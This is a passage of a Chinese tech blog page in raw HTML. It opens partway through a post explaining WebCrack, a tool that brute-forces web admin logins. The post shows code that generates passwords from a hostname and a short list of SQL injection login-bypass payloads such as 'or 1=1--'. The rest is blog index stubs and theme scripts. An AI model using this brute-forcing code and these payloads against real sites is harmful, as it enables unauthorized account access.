class="keyword">if</span> <span class="keyword">not</span> check_ip:</span><br><span class="line">        list2 = host.split(<span class="string">"."</span>)</span><br><span class="line">        i = len(list2)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典1</span></span><br><span class="line">            list3 = list2[u:]</span><br><span class="line">            part = <span class="string">'.'</span>.join(list3)</span><br><span class="line">            <span class="keyword">if</span> (len(part) &lt; <span class="number">5</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dynam_pass_dic.append(part)</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> range(i):  <span class="comment"># 生成url字典2</span></span><br><span class="line">            list3 = list2[u]</span><br><span class="line">            <span class="keyword">if</span> len(list3) &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp_dic.append(list3)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp_dic:</span><br><span class="line">            <span class="keyword">for</span> suffix <span class="keyword">in</span> suffix_dic:</span><br><span class="line">                u = i + suffix</span><br><span class="line">                dynam_pass_dic.append(u)</span><br><span class="line">        <span class="keyword">return</span> dynam_pass_dic</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
<p>如果输入的是一个 IP，则返回一个空的列表。</p>
<h3 id="万能密码">万能密码</h3>
<p>除了弱口令以外，还可能存在万能密码的漏洞，WebCrack中添加了一些常用的payload用来检测是否存在万能密码的漏洞。（缺陷：可能会被WAF拦截）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exp_user_dic = [<span class="string">"admin' or 'a'='a"</span>, <span class="string">"'or'='or'"</span>, <span class="string">"admin' or '1'='1' or 1=1"</span>, <span class="string">"')or('a'='a"</span>, <span class="string">"'or 1=1--"</span>]</span><br><span class="line">exp_pass_dic = exp_user_dic</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exp_able:</span><br><span class="line">    user_dic=exp_user_dic</span><br><span class="line">    pass_dic=exp_pass_dic</span><br><span class="line">    print(<span class="string">'Exp_dic is trying'</span>)</span><br><span class="line">    user_name, pass_word = crack_task( path, data, user_dic, pass_dic,user_key,pass_key,cms_id)</span><br><span class="line">    <span class="keyword">if</span> user_name:</span><br><span class="line">        print(<span class="string">"Rechecking......"</span>,url, user_name, pass_word)</span><br><span class="line">        recheck_flag = recheck(path, data, user_name, pass_word)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recheck_flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    recheck_flag = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h3 id="验证码">验证码</h3>
<p>这部分自动化完成比较困难，这里只提供了一个简单的解决方案</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">captchas = [<span class="string">'验证码'</span>, <span class="string">'验 证 码'</span>,<span class="string">'点击更换'</span>, <span class="string">'点击刷新'</span>,<span class="string">'看不清'</span>,<span class="string">'认证码'</span>,<span class="string">'安全问题'</span>]</span><br><span class="line"><span class="keyword">if</span> cms_id  <span class="keyword">and</span>  cms[cms_id][<span class="string">'captcha'</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"[-] captcha in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">    <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">        log.write(<span class="string">"[-] captcha in login page: "</span>  + url + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cms_id :</span><br><span class="line">        <span class="keyword">for</span> captcha <span class="keyword">in</span> captchas:</span><br><span class="line">            <span class="keyword">if</span> captcha <span class="keyword">in</span> html:</span><br><span class="line">                print(<span class="string">"[-]"</span> + captcha + <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>,time.strftime(<span class="string">'%Y-%m-%d %X'</span>, time.localtime(time.time())))</span><br><span class="line">                <span class="keyword">with</span> open(log_file, <span class="string">'a+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">                    log.write(<span class="string">"[-]"</span> + captcha + <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br></pre></td></tr></table></figure>
<hr>
<p>因为通用型爆破，可能无法做到百分百准确，可以修改配置文件来更符合你的需求。（出现sql错误信息可能存在post注入的情况无法进行爆破）二向箔安全 最近开放了一系列免费的网络安全技能包，通过学习技能不断提升自我能力，在网络安全的世界中不断闯关升级。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/5934/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/5934/" class="post-title-link" itemprop="url">Weekly-28</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-12-30 12:52:05" itemprop="dateCreated datePublished" datetime="2019-12-30T12:52:05+08:00">2019-12-30</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-01-08 10:53:46" itemprop="dateModified" datetime="2020-01-08T10:53:46+08:00">2020-01-08</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/5934/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/5934/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          <p><img src="https://imgs.codewoody.com/uploads/big/77513bce2484c6ab38127447a5093c02.jpg"></p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/posts/5934/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/4972/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/4972/" class="post-title-link" itemprop="url">Weekly-27</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-12-24 11:09:42" itemprop="dateCreated datePublished" datetime="2019-12-24T11:09:42+08:00">2019-12-24</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-01-13 13:03:20" itemprop="dateModified" datetime="2020-01-13T13:03:20+08:00">2020-01-13</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/4972/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/4972/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          <p><img src="https://imgs.codewoody.com/uploads/big/cf4c99ff2d5e5a8d7c77bf088dab3b01.jpg"></p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/posts/4972/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg" alt="治部少辅">
            
              <p class="site-author-name" itemprop="name">治部少辅</p>
              <div class="site-description motion-element" itemprop="description">晚来天雨雪，能饮一杯无？</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">117</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">14</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                      <a href="/tags/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">61</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/huangy10" title="GitHub &rarr; https://github.com/huangy10" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://www.zhihu.com/people/woody-huang" title="知乎 &rarr; https://www.zhihu.com/people/woody-huang" rel="noopener" target="_blank"><i class="fa fa-fw fa-zhihu"></i>知乎</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://www.jianshu.com/u/927273827560" title="简书 &rarr; https://www.jianshu.com/u/927273827560" rel="noopener" target="_blank"><i class="fa fa-fw fa-jianshu"></i>简书</a>
                </span>
              
            </div>
          

          

          
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">治部少辅</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="Total Visitors">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="Total Views">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.0"></script>

  <script src="/js/motion.js?v=7.1.0"></script>



  
  


  <script src="/js/affix.js?v=7.1.0"></script>

  <script src="/js/schemes/pisces.js?v=7.1.0"></script>



  

  


  <script src="/js/next-boot.js?v=7.1.0"></script>


  

  

  

  
  
  <script id="dsq-count-scr" src="https://codewoody.disqus.com/count.js" async></script>







  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
  

  
  
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
  

  
    
      <script type="text/x-mathjax-config">
  

  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$', '$'], ['\\(', '\\)'] ],
      processEscapes: true,
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      
      equationNumbers: {
        autoNumber: 'AMS'
      },
      
    }
  });
  MathJax.Hub.Register.StartupHook('TeX Jax Ready', function() {
    MathJax.InputJax.TeX.prefilterHooks.Add(function(data) {
      if (data.display) {
        var next = data.script.nextSibling;
        while (next && next.nodeName.toLowerCase() === '#text') { next = next.nextSibling }
        if (next && next.nodeName.toLowerCase() === 'br') { next.parentNode.removeChild(next) }
      }
    });
  });
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for (i = 0; i < all.length; i += 1) {
      document.getElementById(all[i].inputID + '-Frame').parentNode.className += ' has-jax';
    }
  });
</script>
<script src="//cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

    
  


  

  

  

  

  

  

  

  

  
<script>
  $('.highlight').each(function(i, e) {
    var $wrap = $('<div>').addClass('highlight-wrap');
    $(e).after($wrap);
    $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function(e) {
      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
        return $(e).text();
      }).toArray().join('\n');
      var ta = document.createElement('textarea');
      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
      ta.style.top = yPosition + 'px'; // Prevent page scroll
      ta.style.position = 'absolute';
      ta.style.opacity = '0';
      ta.readOnly = true;
      ta.value = code;
      document.body.appendChild(ta);
      ta.select();
      ta.setSelectionRange(0, code.length);
      ta.readOnly = false;
      var result = document.execCommand('copy');
      
      ta.blur(); // For iOS
      $(this).blur();
    })).on('mouseleave', function(e) {
      var $b = $(this).find('.copy-btn');
      setTimeout(function() {
        $b.text('Copy');
      }, 300);
    }).append(e);
  })
</script>


  

  


  <script src="https://ethantw.github.io/Han/latest/han.min.js"></script>
  
  <script>
    void function(){
      // window.hinst = Han(document.querySelector('.post-body')).setRoutine([
      //   'initCond',
      //   'renderElem',
      //   'renderJiya',
      //   'renderHanging',
      //   'renderHWS',
      //   'correctBasicBD',
      //   'substCombLigaWithPUA'
      // ]).render()
      document.getElementById("refs")
          .setAttribute("lang", "en_US");
    }()

    </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>
</html>
